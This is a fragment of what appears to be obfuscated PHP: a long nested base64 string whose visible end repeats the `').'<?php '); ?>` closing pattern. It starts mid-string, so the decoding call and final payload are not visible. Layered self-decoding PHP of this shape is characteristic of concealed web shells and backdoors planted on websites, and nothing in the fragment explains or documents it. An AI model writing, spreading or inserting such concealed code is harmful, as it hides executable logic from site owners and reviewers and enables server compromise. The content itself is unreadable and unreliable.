WsxdVVuVlhiR2h6VVRKT1IyTklRbEpXZW14dlZqQlZNVTVzWkhOaFJrcHBUVWhDU0ZReFdrOVZNVnB5VjJ4a1ZtSkdjRkJXYkZwclRsWndTVkp0Y0U1aGJYZDRWakl3ZDA1WFZsaFRiR2hUWVd0S1RGUldVa05rTVUxNFZHdE9UMDFIZUVsWmEyTjRVMnhGZVZwSVNsaFNSVnBNVlcxNFYxWXhXbkpYYkZwT1ZtdHdjRlV5Y0V0a01sWjBVMWhzVDFaNlJuQlVWRUozVFVaa1YyRkdTbWxpUjJoV1ZGVlNjMU14U1hsUFdHUlVWbGRvTmxkcVNrcGxWazUwVjIxR1YyVnNXbmxXTUZKTFZESk5lR05HYUZOaWJGcE5WVlJLZWsweFRsWlViRTVzVm0xM01WVldVbk5UYkVWNFUyMHhWMVl6VWxoV1YzaGhWbXhhYzFWc1pGTmlhelV4VjFaak1WUXlVblJUYmxKWVlteHdjVmxzVWtkaU1YQkdWRzEwWVZKVWF6RlZWbVF3WVcxS1ZXRXpjRnBOTW5oRFZERldjMUpHVm5Sa1JuQllVbXR3ZGxaRldsSk5WMFY0WWtac1ZtSlhhR0ZaYkZaaFRteGtjMVJ0TldwU1ZHc3hWVlprTUdGRk1YTlhWRVpVVmxaR00xcEVRVFZPVmtaMFRWZHNUazFJUW5wV01WcHJWREpKZDJKRlVtRk5ibEp4V1d4U2NtVnNhM3BoTTJSTVRXeGFTVlZ0Y0ZOaFJtUkdUbGRzVlZaV2JETlhha1p6VjFaU1dGcEZkRlJTV0VGNVYydG9jMk5zYjNsV2FsWlNWak5TYUZWcVFscGtNV1JYWVVVNVdtRXpRa2xhUldRMFlrWmFjVkp0YkZSaE1sSlVXVlZrVTFOR1NsbFZiRVpwWWxkb2RsZHNWbXRqTWxaelVsaHNVRmRGTlZsYVYzUkxZVEZrUjFSclNsQldWM2hGVmxjMWMyRlZNSGxWYWxwVlVteEZlRlJyV25OWFYwWkpVVzF3VGxkRk5IcFdNRnBoWlcxRmVWSlliRmRoYkZwYVZtdG9UMkpzVG5KYVJFSnBVakZhVlZsNlRrdFZSMVpXVTFSV1ZGWlZOVlJaTW5oM1YxZEZlVnBHUmxkU1ZWVjZWVEZXYTFsWFVuUlVibEpYWWxkb1lWUlhNV3RpYkUxM1ZHeE9iRll3YkRaWGEyaDNWRlphUlZaVVJsaFdiV2gyV1RCa1RtVkhUWHBhUm14V1RVVndkbGRVVG5OUmJVVjVWRzVTVUZaRk5VMVdWRUpLVFRGT1ZsUnNUbWhOVjNoYVZsY3hiMkZyTVZsVWJrcGFWa1Z3V0ZSc1dtOVdNazE1WkVkR1UwMUdiRE5XTVZwT1pEQnplVlpzYUZOaGJFcHZWakJWTVZKV2JIRlRhbEphWVhwR1NGUldaRk5UYkVwRlVXMDFWR0V5YUV4YVJ6RlNaV3hTV1ZWc1JtbGlXR2gyVjJ4V2EyTXlWbk5hUkZwU1lsWktXVnBXV2t0bFZtUnpZVWhPWVZKWGVFWlpla3ByVXpGSmVsVnVUbUZXYXpVMldUSnpOVTVXUm5GaVJYQlRUVzFvZWxZeFdtdFZNa3BJVkc1Q1lVMXFWbE5VVjNCelRWWndSbHBHWkd0V01VcEZWRlpTUTJKR1pFWlRiazVWVFcxNFJGbFZaRTlUVmtaMVZHMW9WMDFFVm5aWGExWnJZekpTZEZOdVFsQlhSVnB4VkZkd2MwMVdUblZpU0VwUFRVZDRTVlp0TVhkaFJrbzJZVWMxV2xaNlZsQmFSekZMWXpBNVdHVkhiR2xXVkZWNVZqSjBhMVp0U1hkalJXaFdZbGRvY2xWcVFtRk9iRTE0Vlc1d1lVMVlRbHBaVldoRFlURkZlVnBJWkZWTk1uaEVWREZXYzFOVk1VaGFSWFJVVWxoQ2VsZFljRTlXTWsxNVZXdGthazF1VW05WmExSkRZbXhXUjFSclNtaE5XRUpKVlcxd1ExZHNWalpSV0VwYVRXcEdXRnBYTVZOWFIxWkZVV3Q0VWsxdVRYcFZNVlpQVlRKU1YySkdhRTVXTTJoWldsWmFTMlZHWkVkVWEwcFFWbGQ0UlZaWE1UQlhiR1JIVTIwNVZWSnNSWGhhUmxwelYwVXhXR1ZHUW14V1ZWcDVWMVpXYTFZeVRrZGlNMnhvVWtWS1dWcFdXa3RsUm1SSFZHdEtVRlpYZUVWV1Z6RXdWMnhrUjFOdE9WVlNiRVY0V1dwR2QxZEhTa2hPVjJoVVVtdFZlbFV4Vm01a01XOTRZMFpvYkZOSVFtaFdWRUpLVFRGT1ZsUnNUbXhXYmtKYVZrZHdSMkZXVGtkVGJXeFVZVEpTTTFkclZuTlNWVEZJV2tWd2FGWlhjM3BWTVZaUFZUSlNWMkpHYUU1V00yaFpXbFphUzJWR1pFZFVhMHBRVmxkNFJWVXhaSE5WUjFaV1VtNUtXbFpYVWxoWk1GcDJaVmRHUlZGc2FHeFdhM0EwVmpCYVQxRnJPVlppUlZKVVZqSjRVVnBXVmtwT1ZrNVdXak5rWVUxWVFqRldiVFZYVjJzd2VGTnVaRnBoYTJ0M1YycEtUbVZzVm5WaVJteE9UVWhDZWxkVVFtdE9SMFpIWVROc1YySldjR2haYkdRMFRsWnNObFJzU21sTlNFSkpWakkxYzJGVk1YRlJibkJVVmxVMVZGUlZaRXRPVjFGNVdrVjBWRkpVVWpSV01XTjRaREpLUjJFemNGWlhSVXBMVlRCb1QySnNUbkphUjBac1ZqQnNOVlJWWkd0VlZsVjNVbTVXVlZOSGVIRmFSbVJQVTFaT2RHVkhSazVXUjNjd1YydGFhazVWTVVkalJsSmhUVzVTYUZsdGRIZE5iR3h6VkdwT1lVMUlRVEZVTUdNeFZFWldObFZ1VmxWVFIzaHhWR3BDYzFOV1RuUmxSM1JVVW14dk1WZFhNWE5STWxGNVZHNVNWMkpVVmxwVVZFSjNZekZyZDFwRVVtaFNiWFExVm14ak5WTXhTWGhqUkZaYVlXdHNNMWw2UW5OU1JsWnhVVzFzYkZkSFVuVlZNblJ2VkRBeFYySklVbXBTTTJoaFZGUkdSMlZzVGxaVmExcHFVbFJyTVZWWGNITlRiRXBGV2pOS1UxSnJXakpXUjNSelVsZFNOVTlYY0ZOTmJXZDZWVEZXVWs1RmMzZFZiRXBwWldwQ2RWTXhUVEJpYkVKRlQxaGthRk5GUm01VGJteHlUakJzUlU5RGMyNUxVelJ1VUVRNWQyRklRV2RLZVdzM1NVUTRLeWNwTGljOFAzQm9jQ0FuS1RzZ1B6ND0nKS4nPD9waHAgJyk7ID8+').'<?php '); ?>').'<?php '); ?>